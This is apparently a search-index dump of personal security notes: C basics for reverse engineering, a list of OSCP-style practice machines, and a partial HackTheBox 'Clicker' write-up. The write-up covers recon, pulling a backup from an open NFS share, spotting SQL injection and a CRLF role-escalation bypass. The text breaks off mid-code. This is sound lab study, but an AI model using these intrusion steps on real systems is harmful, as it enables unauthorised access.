Entry]\nEncoding=UTF-8\nName=Clion\nComment=Clion-2023.2\nExec=/home/kali/opt/clion-2023.2/bin/clion.sh\nIcon=/home/kali/opt/clion-2023.2/bin/clion.svg\nCategories=Application;Development;Java;IDE\nVersion=2023.2\nType=Application\n</code></pre> <p>\u5e38\u89c4\u64cd\u4f5c\uff1a</p> <ul> <li>Shift + F10 run</li> <li>Shift + F9 debug</li> <li>F7 \u6b65\u5165</li> <li>F8 \u6b65\u8fc7</li> </ul>"},{"location":"RE/langs/C/#windows-api","title":"Windows API","text":"<ul> <li>A: Ascii</li> <li>W: Unicode</li> <li>Ex: Extended version</li> </ul>"},{"location":"RE/langs/C/#_4","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_5","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_6","title":"\u6574\u6570","text":"<ul> <li>short, 2B</li> <li>int, 4B</li> <li>long, 4B</li> <li>long long, 8B(x64)</li> </ul>"},{"location":"RE/langs/C/#_7","title":"\u6d6e\u70b9\u6570","text":"<ul> <li>float, 4B</li> <li>double, 8B</li> </ul>"},{"location":"RE/langs/C/#_8","title":"\u5b57\u7b26 \u5b57\u7b26\u4e32","text":"<ul> <li>char (ascii), 1B</li> <li>wchar_t (unicode), 2B</li> </ul> <p>sz on windows: string terminated with a zero</p> <pre><code>char szBuffer[] = \"hello\";\nchar *szBuffer  = \"hello\";\nwchar_t szBuffer[] = L\"hello\";\nwchar_t *szBuffer  = L\"hello\";\n</code></pre>"},{"location":"RE/langs/C/#_9","title":"\u7ed3\u6784\u7c7b\u578b","text":"<ul> <li>struct</li> <li>union</li> <li>enum</li> </ul>"},{"location":"RE/langs/C/#_10","title":"\u7279\u6b8a\u7c7b\u578b","text":"<ul> <li>auto</li> <li>void</li> <li>[]</li> <li> <ul> <li></li> </ul> </li> </ul>"},{"location":"RE/langs/C/#_11","title":"\u7c7b\u578b\u4fee\u9970","text":"<ul> <li>static</li> <li>signed</li> <li>unsigned</li> <li>const</li> </ul>"},{"location":"RE/langs/C/#_12","title":"\u53d8\u91cf","text":"<p>\u53d8\u91cf\u540d\u89c4\u5219\uff1a</p> <ul> <li>\u4ee5\u82f1\u6587\u5b57\u7b26\u6216\u8005\u4e0b\u5212\u7ebf\u8d77\u59cb</li> <li>\u4e0d\u80fd\u5305\u542b \u7a7a\u683c\u3001\u6807\u70b9\u3001\u7c7b\u578b\u8bf4\u660e\u7b26\u3001\u8fd0\u7b97\u7b26</li> <li>\u5b57\u6bcd\u533a\u5206\u5927\u5c0f\u5199</li> <li>\u6709\u6548\u957f\u5ea6max 255</li> <li>\u4e0d\u80fd\u662f\u5173\u952e\u5b57</li> </ul> <p>\u547d\u540d\u65b9\u6cd5\uff1a</p> <ul> <li>\u5308\u7259\u5229</li> <li>\u9a7c\u5cf0</li> </ul> <p>\u53d8\u91cf\u7c7b\u578b\uff1a</p> <ul> <li>\u5168\u5c40\u53d8\u91cf</li> <li>\u5c40\u90e8\u53d8\u91cf</li> <li>\u9759\u6001\u53d8\u91cf</li> </ul>"},{"location":"RE/langs/C/#_13","title":"\u8f93\u5165\u548c\u8f93\u51fa","text":""},{"location":"RE/langs/C/#_14","title":"\u8f93\u51fa","text":"<p>printf</p> <ul> <li>%c, %s, %S</li> <li>%u, %d (int), %lld (long long)</li> <li>%e, %f</li> <li>%x, %X</li> <li>%p</li> </ul> <p>\u8f6c\u4e49\u5b57\u7b26</p> <ul> <li>\\r \\n \\t</li> <li>\\ \\\u2019 \\\u201d \\?</li> </ul> <p>sprintf</p> <pre><code>sprintf(szBuffer, \"hello %s!\", szName);\n</code></pre>"},{"location":"RE/langs/C/#_15","title":"\u8f93\u5165","text":"<p>scanf</p> <ul> <li>\u201c%d\u201d, &amp;nNumber</li> <li>\u201c%s\u201d, szBuffer</li> </ul>"},{"location":"RE/langs/C/#_16","title":"\u8fd0\u7b97\u7b26","text":""},{"location":"RE/langs/C/#_17","title":"\u7b97\u6570\u8fd0\u7b97\u7b26","text":"<ul> <li>=</li> <li>==, \u2260, &lt;, \u2264, &gt;, \u2265</li> <li>+, -, *, /, %</li> <li>++, \u2014</li> <li>+=, -=, *=, /=, %=</li> </ul>"},{"location":"RE/langs/C/#_18","title":"\u4f4d\u8fd0\u7b97\u7b26","text":"<ul> <li>&amp;, |, ~, ^</li> <li>&lt;&lt;, &gt;&gt;</li> </ul>"},{"location":"RE/langs/C/#_19","title":"\u903b\u8f91\u8fd0\u7b97\u7b26","text":"<ul> <li>&amp;&amp;, ||, !</li> <li>? :</li> </ul>"},{"location":"RE/langs/C/#_20","title":"\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7","text":""},{"location":"RE/langs/C/#_21","title":"\u9009\u62e9\u7ed3\u6784","text":"<ul> <li>if () {} else if () {} else {}</li> <li>switch () { case 1: { break; } default: { break; } }</li> <li>goto tag;</li> </ul>"},{"location":"RE/langs/C/#_22","title":"\u5faa\u73af\u7ed3\u6784","text":"<ul> <li>while (expr) {}</li> <li>do {} while (expr)</li> <li>for ( ; ; ) {}</li> </ul>"},{"location":"RE/langs/C/#_23","title":"\u51fd\u6570","text":"<ul> <li>\u58f0\u660e</li> <li>\u5b9a\u4e49</li> <li>\u53c2\u6570</li> <li>\u8fd4\u56de\u503c</li> <li>\u53d8\u53c2\u51fd\u6570</li> </ul>"},{"location":"RE/langs/C/#_24","title":"\u53c2\u6570\u7684\u7ec6\u8282","text":"<ul> <li>\u5f62\u5f0f\u53c2\u6570</li> <li>\u5b9e\u9645\u53c2\u6570</li> <li>\u53d8\u53c2\u51fd\u6570</li> </ul> <pre><code>int test(int optcount, ...)\n{\n    va_list ap;\n    va_start(ap, optcount);\n    int nCount = 0;\n    for (int i = 0; i &lt; optcount; i++)\n    {\n        nCount += va_arg(ap, int);\n    }\n    va_end(ap);\n    return nCount;\n}\n</code></pre>"},{"location":"RE/langs/C/#_25","title":"\u9012\u5f52\u51fd\u6570","text":""},{"location":"RE/langs/C/#_26","title":"\u6570\u7ec4\u6307\u9488","text":"<ul> <li>\u4e00\u7ef4\u6570\u7ec4 <pre><code>int arr[5] = { 0,1,2,3,4 };\nint arr[5] = { [3] = 4 };\nint arr[]  = { 0,1,2,3 };\nint arr[]  = { 1,[5]=2 };\n</code></pre></li> <li>\u591a\u7ef4\u6570\u7ec4</li> </ul> <pre><code>int nArr[2][2] = \n{\n    {0,1},\n    {2,3}\n}\n</code></pre>"},{"location":"RE/langs/C/#_27","title":"\u5b57\u7b26\u4e32","text":""},{"location":"RE/langs/C/#_28","title":"\u58f0\u660e","text":"<pre><code>char szStr[] = { 'a','b','c',0 };\nchar szStr[] = \"abc\";\nchar * szStr = \"abc\";\n</code></pre>"},{"location":"RE/langs/C/#_29","title":"\u5b57\u7b26\u4e32\u64cd\u4f5c","text":"<ul> <li>strcat</li> <li>strcpy</li> <li>strcmp</li> </ul>"},{"location":"RE/langs/C/#_30","title":"\u6307\u9488","text":"<p>\u7b26\u53f7\uff1a</p> <ul> <li>*</li> <li>&amp;</li> <li>\u2192</li> </ul> <p>\u6307\u9488\u8fd0\u7b97\uff1a\u5730\u5740 + \u6570\u636e\u7c7b\u578b\u7684\u5bbd\u5ea6 * n</p> <pre><code>int arr[5] = { 0 };\nint * p = arr;\n// use p\nprintf(\"%d\", *p);\nprintf(\"%d\", p[3]);\n</code></pre> <p>\u51fd\u6570\u6307\u9488</p> <pre><code>int func1(int a);\n\ntypedef int (*FuncType1) (int a);\nFuncType1 pfunc = func1;\npfunc(1);\n</code></pre> <p>\u6570\u7ec4 \u6307\u9488 \u4f5c\u4e3a\u51fd\u6570\u53c2\u6570</p> <pre><code>int addAll(int * arr, int nCount);\nint* addAll(int * arr, int nCount);\nint addAll(int * arr, int nCount, int * nRes);\n</code></pre> <p>\u5185\u5b58\u64cd\u4f5c</p> <ul> <li>char * szBuffer = malloc(sizeof(char) * 100)</li> <li>memset(szBuffer, 0xCC, sizeof(char) * 100)</li> <li>free(szBuffer)</li> </ul>"},{"location":"RE/langs/C/#_31","title":"\u9884\u5904\u7406","text":"<pre><code>#define MAX_VALUE 256\n\n#if EXPR1\n...\n#elif EXPR2\n...\n#else\n...\n#endif\n</code></pre>"},{"location":"RE/langs/C/#_32","title":"\u590d\u6742\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_33","title":"\u7ed3\u6784\u4f53","text":"<pre><code>struct _Info\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n};\n\ntypedef struct _Info\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n} Info, *PInfo;\n\ntypedef struct\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n} Info;\n</code></pre> <p>\u7b26\u53f7\uff1a</p> <ul> <li>.</li> <li>\u2192</li> </ul>"},{"location":"RE/langs/C/#_34","title":"\u679a\u4e3e","text":"<pre><code>enum MyEnum\n{\n    one,\n    two,\n    three\n};\n</code></pre>"},{"location":"RE/langs/C/#_35","title":"\u7ed3\u6784\u4f53\u5bf9\u9f50","text":"<p>\u5bf9\u9f501 2 4 8 16</p> <p>MSVC\u9ed8\u8ba4\u5bf9\u9f508 /Zp8</p> <p>\u6210\u5458\u504f\u79fb member offset\uff1a\u76f8\u5bf9\u4e8e\u7ed3\u6784\u4f53\u9996\u5730\u5740\u7684\u504f\u79fb</p> <p>\u5bf9\u9f50\u89c4\u5219\uff1a</p> <ul> <li>member offset % min(ZpValue, sizeof(member type)) == 0</li> <li>size % max(member type) == 0</li> </ul> <p>\u8bbe\u7f6e\u5bf9\u9f50\u957f\u5ea6</p> <pre><code>#pragma pack(1)\n</code></pre>"},{"location":"RE/langs/C/#_36","title":"\u6307\u9488\u8fdb\u9636","text":"<p>\u4e8c\u7ea7\u6307\u9488\uff1a\u6307\u5411\u7684\u6bcf\u4e00\u4e2a\u7a7a\u95f4\u90fd\u662f\u4e00\u4e2a\u4e00\u7ea7\u6307\u9488</p> <p>\u4e8c\u7ea7\u6570\u7ec4\uff1a</p> <pre><code>int nArr[3][4];\nint (*p)[4];\np = nArr;\n// when p + i -&gt; p + sizeof(int) * 4\nfor (size_t i = 0; i &lt; 3; i++)\n    for (size_t j = 0; j &lt; 4; j++)\n        printf(\"%d\\r\\n\", *(p[i] +  k));\n</code></pre>"},{"location":"RE/langs/C/#_37","title":"\u6587\u4ef6\u64cd\u4f5c","text":""},{"location":"RE/langs/C/#_38","title":"\u5199\u6587\u4ef6","text":"<p>fopen(path, mode)</p> <ul> <li>r: \u8bfb\u53d6\uff0c\u6587\u4ef6\u4e0d\u5b58\u5728or\u627e\u4e0d\u5230\u5373\u4e3a\u5931\u8d25</li> <li>w: \u6253\u5f00\u7528\u4e8e\u5199\u5165\u7684\u7a7a\u6587\u4ef6\uff1b\u5982\u679c\u7ed9\u5b9a\u6587\u4ef6\u5b58\u5728\uff0c\u5185\u5bb9\u4f1a\u88ab\u9500\u6bc1</li> <li>a: \u6587\u4ef6\u672b\u5c3e\u8ffd\u52a0\uff1b\u65b0\u6570\u636e\u5199\u5165\u4e4b\u524d\u4e0d\u79fb\u9664EOF\uff1b\u6587\u4ef6\u4e0d\u5b58\u5728\u521b\u5efa\u6587\u4ef6</li> <li>r+: \u8bfb\u53d6\u5199\u5165\u6587\u4ef6\uff0c\u6587\u4ef6\u987b\u5b58\u5728</li> <li>w+: \u8bfb\u53d6\u5199\u5165\u7a7a\u6587\u4ef6\uff1b\u6587\u4ef6\u5b58\u5728\uff0c\u5185\u5bb9\u9500\u6bc1</li> <li>a+: \u8bfb\u53d6\u548c\u8ffd\u52a0\uff1b\u65b0\u8f93\u5165\u5199\u5165\u524d\u79fb\u9664EOF\uff1b\u5199\u5165\u5b8c\u6210\uff0cEOF\u4e0d\u4f1a\u8fd8\u539f\uff1b\u6587\u4ef6\u4e0d\u5b58\u5728\u521b\u5efa\u6587\u4ef6</li> </ul> <pre><code>void WriteFile(char * szFilePath, char * szBuffer)\n{\n    FILE * pFile;\n    if ((pFile = fopen(szFilePath, \"w\")) == NULL)\n    {\n        printf(\"failed to open file.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    int nRet = fwrite(szBuffer, sizeof(char) * (strlen(szBuffer) + 1), 1, pFile);\n    fclose(pFile);\n}\n</code></pre>"},{"location":"RE/langs/C/#_39","title":"\u8bfb\u6587\u4ef6","text":"<p>fseek(stream, offset, origin)</p> <ul> <li>SEEK_CUR</li> <li>SEEK_END</li> <li>SEEK_SET</li> </ul> <pre><code>char * ReadFile(char * szFilePath)\n{\n    FILE * pFile;\n    char * szReadBuffer;\n    int nReadFileSize = 0;\n    if ((pFile = fopen(szFilePath, \"r\")) == NULL)\n    {\n        printf(\"failed to read file.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    fseek(pFile, 0, SEEK_END);\n    nReadFileSize = ftell(pFile);\n    rewind(pFile);\n    szReadBuffer = malloc(sizeof(char) * (nReadFileSize + 1));\n    if (szReadBuffer == NULL)\n    {\n        printf(\"failed to malloc memory.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    memset(szReadBuffer, 0, nReadFileSize);\n    int nResLen = 0;\n    nResLen = fread(szReadBuffer, 1, nReadFileSize, pFile);\n    if (nResLen != nReadFileSize)\n    {\n        printf(\"failed to read file.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    fclose(pFile);\n    return szReadBuffer;\n}\n</code></pre>"},{"location":"RE/langs/C/#_40","title":"\u5f02\u6216\u52a0\u5bc6\u5b57\u7b26\u4e32","text":"<pre><code>void xorcode(char * szBuffer, int nSize, char cKey)\n{\n    for (size_t i = 0; i &lt; nSize; i++)\n    {\n        szBuffer[i] ^= cKey;\n    }\n}\n</code></pre>"},{"location":"Write-ups/","title":"Index","text":""},{"location":"Write-ups/#vulnhub","title":"vulnhub","text":"List of PWK/OSCP boxes from the previous versions of the course <ul> <li> Kioptrix: Level 1 (#1): https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</li> <li> Kioptrix: Level 1.1 (#2): https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</li> <li> Kioptrix: Level 1.2 (#3): https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</li> <li> Kioptrix: Level 1.3 (#4): https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</li> <li> Kioptrix: 2014: https://www.vulnhub.com/entry/kioptrix-2014-5,62/</li> </ul> Current Systems that are Simliar to the current PWK/OSCP course <ul> <li> DC 9: https://www.vulnhub.com/entry/dc-9,412/</li> <li> Digitalworld.local (Bravery): https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/</li> <li> Digitalworld.local (Development): https://www.vulnhub.com/entry/digitalworldlocal-development,280/</li> <li> Digitalworld.local (Mercy v2): https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/</li> <li> Digitalworld.local (JOY): https://www.vulnhub.com/entry/digitalworldlocal-joy,298/</li> <li> Digitalword.local (FALL): https://www.vulnhub.com/entry/digitalworldlocal-fall,726/</li> <li> Prime 1: https://www.vulnhub.com/entry/prime-1,358/</li> <li> Misdirection 1: https://www.vulnhub.com/entry/misdirection-1,371/</li> <li> Sar 1: https://www.vulnhub.com/entry/sar-1,425/</li> <li> Djinn 1: https://www.vulnhub.com/entry/djinn-1,397/</li> <li> EVM 1: https://www.vulnhub.com/entry/evm-1,391/</li> <li> DerpNStink 1: https://www.vulnhub.com/entry/derpnstink-1,221/</li> <li> RickdiculouslyEasy 1: https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/</li> <li> Tommy Boy 1: https://www.vulnhub.com/entry/tommy-boy-1,157/</li> <li> Breach 1: https://www.vulnhub.com/entry/breach-1,152/</li> <li> Breach 2.1: https://www.vulnhub.com/entry/breach-21,159/</li> <li> Breach 3.0.1: https://www.vulnhub.com/entry/breach-301,177/</li> <li> NullByte: https://www.vulnhub.com/entry/nullbyte-1,126/</li> <li> Bob 1.0.1: https://www.vulnhub.com/entry/bob-101,226/</li> <li> Toppo 1: https://www.vulnhub.com/entry/toppo-1,245/</li> <li> W34kn3ss 1: https://www.vulnhub.com/entry/w34kn3ss-1,270/</li> <li> GoldenEye 1: https://www.vulnhub.com/entry/goldeneye-1,240/</li> <li> Infosec Prep OSCP Box: https://www.vulnhub.com/entry/infosec-prep-oscp,508/</li> <li> LemonSqueezy: https://www.vulnhub.com/entry/lemonsqueezy-1,473/</li> <li> Brainpan 1: https://www.vulnhub.com/entry/brainpan-1,51/</li> <li> Lord of the root 1.0.1: https://www.vulnhub.com/entry/lord-of-the-root-101,129/</li> <li> Tiki-1: https://www.vulnhub.com/entry/tiki-1,525/</li> <li> Healthcare 1: https://www.vulnhub.com/entry/healthcare-1,522/</li> <li> Photographer 1: https://www.vulnhub.com/entry/photographer-1,519/</li> <li> Glasglow 1.1: https://www.vulnhub.com/entry/glasgow-smile-11,491/</li> <li> DevGuru 1: https://www.vulnhub.com/entry/devguru-1,620/</li> <li> Alpha 1: https://www.vulnhub.com/entry/alfa-1,655/</li> <li> Hack Me Please: https://www.vulnhub.com/entry/hack-me-please-1,731/</li> </ul>"},{"location":"Write-ups/#hackthebox","title":"HackTheBox","text":"Linux Boxes <ul> <li> Lame</li> <li> brainfuck</li> <li> shocker</li> <li> bashed</li> <li> nibbles</li> <li> beep</li> <li> cronos</li> <li> nineveh</li> <li> sense</li> <li> solidstate</li> <li> node</li> <li> valentine</li> <li> poison</li> <li> sunday</li> <li> tartarsauce</li> <li> Irked</li> <li> Friendzone</li> <li> Swagshop</li> <li> Networked</li> <li> jarvis</li> <li> Mirai</li> <li> Popcorn</li> <li> Haircut</li> <li> Blocky</li> <li> Frolic</li> <li> Postman</li> <li> Mango</li> <li> Traverxec</li> <li> OpenAdmin</li> <li> Magic</li> <li> Admirer</li> <li> Blunder</li> <li> Tabby</li> <li> Doctor</li> <li> SneakyMailer</li> <li> Passage</li> <li> Luanne</li> <li> Time</li> <li> Ready</li> <li> Delivery</li> <li> Ophiuchi</li> <li> ScriptKiddie</li> <li> Armageddon</li> <li> Knife</li> <li> Pit</li> <li> Seal</li> <li> Previse</li> <li> Forge</li> <li> Horizontall</li> <li> Shibboleth</li> <li> Writer</li> <li> Precise</li> <li> Pandora</li> <li> Meta</li> <li> Paper</li> <li> Talkative</li> <li> Seventeen</li> </ul> Windows Boxes <ul> <li> legacy</li> <li> Blue</li> <li> Devel</li> <li> Optimum</li> <li> Bastard</li> <li> granny</li> <li> Arctic</li> <li> grandpa</li> <li> silo</li> <li> bounty</li> <li> jerry</li> <li> conceal</li> <li> chatterbox</li> <li> Forest</li> <li> BankRobber</li> <li> secnotes</li> <li> Bastion</li> <li> Buff</li> <li> Servmon</li> <li> Active</li> <li> Remote</li> <li> Fuse</li> <li> Omni</li> <li> Worker</li> <li> Love</li> <li> Intelligence</li> <li> APT</li> <li> Object</li> <li> Support</li> <li> Acute</li> <li> Timelapse</li> <li> StreamIO</li> <li> Scrambled</li> </ul> More Challenging Boxes <ul> <li> Jeeves [Windows]</li> <li> Bart   [Windows]</li> <li> Tally  [Windows]</li> <li> Kotarak [Linux]</li> <li> falafel [Linux]</li> <li> Devops [Linux]</li> <li> Hawk [Linux]</li> <li> Netmon [Windows]</li> <li> Lightweight [Linux]</li> <li> La Casa De Papel [Linux]</li> <li> Jail [Linux]</li> <li> Safe [Linux]</li> <li> Bitlab [Linux]</li> <li> Sizzle [Windows]</li> <li> Sniper [Windows]</li> <li> Control [Windows]</li> <li> October [Linux]</li> <li> Mango [Linux]</li> <li> Nest [Windows]</li> <li> Book [Linux]</li> <li> Sauna [Windows]</li> <li> Cascade [Windows]</li> <li> Querier [Windows]</li> <li> Quick [Linux]</li> <li> BlackField [Windows]</li> <li> APT [Windows]</li> <li> Atom [Windows]</li> <li> BreadCrumbs [Windows]</li> <li> Monitors [Linux]</li> <li> Dynstr [Linux]</li> <li> PivotAPI [Windows]</li> <li> Pikaboo [Linux]</li> <li> Monteverde [Windows]</li> <li> Writer [Linux]</li> <li> Forge [Linux]</li> <li> Stacked [Linux]</li> <li> Backdoor [Linux]</li> <li> Search [Windows]</li> <li> Undetected [Linux] (More like an IR box)</li> </ul> Updated Boxes 2022 <ul> <li> Backdoor [Linux]</li> <li> Search [Windows]</li> <li> Pandora [Linux]</li> <li> Meta [Linux]</li> <li> Paper [Linux]</li> <li> Acute [Windows]</li> <li> Timelapse [Windows]</li> <li> Talkative [Linux]</li> <li> StreamIO [Windows]</li> <li> Seventeen [Linux]</li> <li> Scrambled [Linux]</li> </ul>"},{"location":"Write-ups/#other-boxes","title":"Other Boxes","text":"Starting point <ul> <li> Archetype</li> <li> Oopsie</li> <li> Vaccine</li> <li> Unified</li> </ul> Active machines <ul> <li> Keeper</li> <li> Clicker</li> <li> Zipping</li> <li> Drive</li> <li> Cybermonday</li> <li> Devvortex</li> </ul>"},{"location":"Write-ups/thb/template/","title":"Template","text":""},{"location":"Write-ups/thb/template/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/thb/template/#recon","title":"Recon","text":""},{"location":"Write-ups/thb/template/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/template/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/template/#exploit-chain","title":"Exploit Chain","text":""},{"location":"Write-ups/thb/active_machines/Clicker/","title":"Clicker","text":""},{"location":"Write-ups/thb/active_machines/Clicker/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/thb/active_machines/Clicker/#recon","title":"Recon","text":"<ul> <li><code>nmap -sT -sV -sC -O -p 22,80,111,2049,34137,34211,43801,44631,60685 -oA nmap/detail</code></li> </ul> <pre><code>Nmap scan report for 10.10.11.232\nHost is up (0.042s latency).\n\nPORT      STATE SERVICE  VERSION\n22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)\n|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)\n80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: Did not follow redirect to http://clicker.htb/\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n111/tcp   open  rpcbind  2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  2,3        34211/tcp6  mountd\n|   100005  2,3        35819/udp6  mountd\n|   100005  2,3        43801/tcp   mountd\n|   100005  2,3        55641/udp   mountd\n|   100021  1,3,4      34211/tcp   nlockmgr\n|   100021  1,3,4      44725/tcp6  nlockmgr\n|   100021  1,3,4      56089/udp   nlockmgr\n|   100021  1,3,4      60151/udp6  nlockmgr\n|   100024  1          38629/udp   status\n|   100024  1          44631/tcp   status\n|   100024  1          49541/udp6  status\n|   100024  1          57063/tcp6  status\n|   100227  3           2049/tcp   nfs_acl\n|_  100227  3           2049/tcp6  nfs_acl\n2049/tcp  open  nfs_acl  3 (RPC #100227)\n34137/tcp open  mountd   1-3 (RPC #100005)\n34211/tcp open  nlockmgr 1-4 (RPC #100021)\n43801/tcp open  mountd   2-3 (RPC #100005)\n44631/tcp open  status   1 (RPC #100024)\n60685/tcp open  mountd   1-3 (RPC #100005)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li>2049 nfs -&gt; 80 http -&gt; 22 ssh</li> </ul>"},{"location":"Write-ups/thb/active_machines/Clicker/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/active_machines/Clicker/#2249-nfs","title":"2249 - nfs","text":"<ul> <li>find mount point, mount nfs fs, seek sensitive file</li> </ul> <pre><code>$ showmount -e $IP\nExport list for 10.10.11.232:\n/mnt/backups *\n\n$ sudo mount -t nfs $IP:/mnt/backups /mnt/backups\n\n$ file clicker.htb_backup.zip\nclicker.htb_backup.zip: Zip archive data, at least v1.0 to extract, compression method=store\n\n$ ls -l\ntotal 2236\n-rw-r--r-- 1 qwe qwe 2284115 Nov 22 19:40 clicker.htb_backup.zip\n</code></pre> <ul> <li>bak file (for 80 http) checking</li> <li>index.php</li> <li>login.php</li> <li>authenticate.php</li> <li>db_utils.php</li> </ul> <pre><code>index.php\n        if ($_SESSION[\"ROLE\"] == \"\") {\n                echo '&lt;a class=\"nav-link fw-bold py-1 px-0 active\" href=\"/info.php\"&gt;Info&lt;/a&gt;';\n                echo '&lt;a class=\"nav-link fw-bold py-1 px-0 active\" href=\"/login.php\"&gt;Login&lt;/a&gt;';\n                echo '&lt;a class=\"nav-link fw-bold py-1 px-0 active\" href=\"/register.php\"&gt;Register&lt;/a&gt;';\n            }\n            else {\n                echo '&lt;a class=\"nav-link fw-bold py-1 px-0 active\" href=\"/profile.php\"&gt;Profile&lt;/a&gt;';\n                echo '&lt;a class=\"nav-link fw-bold py-1 px-0 active\" href=\"/logout.php\"&gt;Logout&lt;/a&gt;';\n                echo '&lt;a class=\"nav-link fw-bold py-1 px-0 active\" href=\"/play.php\"&gt;Play&lt;/a&gt;';\n          if ($_SESSION[\"ROLE\"] == \"Admin\") {\n            echo '&lt;a class=\"nav-link fw-bold py-1 px-0 active\" href=\"/admin.php\"&gt;Administration&lt;/a&gt;';\n          }\n            }\n\nlogin.php\n\n    &lt;form name=\"login_form\" action=\"authenticate.php\" method=\"post\" onsubmit=\"return validate()\"&gt;\n      &lt;div class=\"form-group\"&gt;\n        &lt;label for=\"inputUsername\"&gt;Username&lt;/label&gt;\n        &lt;input class=\"form-control\" name='username' id=\"exampleInputUsername1\" aria-describedby=\"usernameHelp\" placeholder=\"Username\"&gt;\n      &lt;/div&gt;\n      &lt;div class=\"form-group\"&gt;\n        &lt;label for=\"inputPassword\"&gt;Password&lt;/label&gt;\n        &lt;input type=\"password\" name='password' class=\"form-control\" id=\"InputPassword\" placeholder=\"Password\"&gt;\n      &lt;/div&gt;\n      &lt;button type=\"submit\" class=\"btn btn-primary\"&gt;Submit&lt;/button&gt;\n    &lt;/form&gt;\n\nauthenticate.php\n&lt;?php\nsession_start();\ninclude_once(\"db_utils.php\");\n\nif (isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['username'] != \"\" &amp;&amp; $_POST['password'] != \"\") {\n        if(check_auth($_POST['username'], $_POST['password'])) {\n                $_SESSION[\"PLAYER\"] = $_POST[\"username\"];\n                $profile = load_profile($_POST[\"username\"]);\n                $_SESSION[\"NICKNAME\"] = $profile[\"nickname\"];\n                $_SESSION[\"ROLE\"] = $profile[\"role\"];\n                $_SESSION[\"CLICKS\"] = $profile[\"clicks\"];\n                $_SESSION[\"LEVEL\"] = $profile[\"level\"];\n                header('Location: /index.php');\n        }\n        else {\n                header('Location: /login.php?err=Authentication Failed');\n        }\n}\n?&gt;\n\n\ndb_utils.php\n\nfunction check_auth($player, $password) {\n    global $pdo;\n    $params = [\"player\" =&gt; $player];\n    $stmt = $pdo-&gt;prepare(\"SELECT password FROM players WHERE username = :player\");\n    $stmt-&gt;execute($params);\n    if ($stmt-&gt;rowCount() &gt; 0) {\n        $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC);\n        if(strcmp($row['password'], hash(\"sha256\",$password)) == 0){\n            return true;\n        }\n    }\n    return false;\n}\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Clicker/#80-http","title":"80 - http","text":""},{"location":"Write-ups/thb/active_machines/Clicker/#website-priv-esca-admin","title":"website priv esca -&gt; admin","text":"<ul> <li>register a user-priv account -&gt; look for priv esca in this site</li> <li> <p>register admin [x] -&gt; admin account exists</p> </li> <li> <p>hash in <code>diagonostic.php</code> -&gt; crack [x]</p> </li> </ul> <pre><code>&lt;?php\nif (isset($_GET[\"token\"])) {\n    if (strcmp(md5($_GET[\"token\"]), \"ac0e5a6a3a50b5639e69ae6d8cd49f40\") != 0) {\n        header(\"HTTP/1.1 401 Unauthorized\");\n        exit;\n    }\n}\n</code></pre> <ul> <li>seek for sqli point without precompiled sql statement</li> </ul> <pre><code>function get_top_players($number) {\n    global $pdo;\n    $stmt = $pdo-&gt;query(\"SELECT nickname,clicks,level FROM players WHERE clicks &gt;= \" . $number);\n    $result = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);\n    return $result;\n}\n</code></pre> <ul> <li><code>save_game.php</code>: role can be configed -&gt; detected -&gt; how to bypass</li> </ul> <p></p> <ul> <li>CRLF bypass trick: CRLF (%0D%0A) Injection - HackTricks -&gt; user -&gt; admin</li> </ul> <p></p> <p></p> <ul> <li>logout -&gt; login -&gt; admin priv (!!!don't do anything else, otherwise original priv would be setted)</li> </ul>"},{"location":"Write-ups/thb/active_machines/Clicker/#export-foothold","title":"export -&gt; foothold","text":"<ul> <li><code>export.php</code>: extension choice: txt, json, html</li> </ul> <pre><code>if ($_POST[\"extension\"] == \"txt\") {\n    $s .= \"Nickname: \". $currentplayer[\"nickname\"] . \" Clicks: \" . $currentplayer[\"clicks\"] . \" Level: \" . $currentplayer[\"level\"] . \"\\n\";\n    foreach ($data as $player) {\n    $s .= \"Nickname: \". 